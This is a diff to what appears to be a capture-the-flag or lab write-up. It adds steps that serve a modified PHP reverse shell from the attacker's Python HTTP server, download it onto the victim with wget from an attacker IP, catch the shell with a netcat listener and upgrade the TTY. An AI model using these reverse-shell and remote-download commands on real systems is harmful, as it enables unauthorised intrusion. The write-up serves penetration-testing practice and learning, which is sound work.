@@ -149,5 +149,33 @@ https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell
 
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/f1c71928-734c-46a5-a28a-1b53d5fb914e"></picture><br>We are going to go to the web previously mentioned and copy the code changing the selected lines in the image, we will call this file “shell.php”.</h3>
 
+### **- From our attacking machine we will create an http server with python to upload our file to the compromised machine.**
 
+```bash
+python3 -m http.server 80
+```
 
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/16e6c3b5-bcb4-4d80-b994-081d16ce2f4b"></picture><br></h3>
+
+### **- From the victim machine we download the file**
+
+```bash
+wget http://10.21.118.81/shell.php
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/091c55c7-4eab-4c3c-9218-0ee4cec7527e"></picture><br></h3>
+
+### **- From our attacking machine we will listen on the assigned port**
+
+```bash
+nc -nlvp 444
+```
+```
+treatment of tty
+script /dev/null -c bash
+"CTRL+Z"
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+<h3 align="center"><picture><img src = "!https://github.com/user-attachments/assets/f28fe028-5533-44b7-8742-89ea78218a6c"></picture><br>We are in like a root</h3>
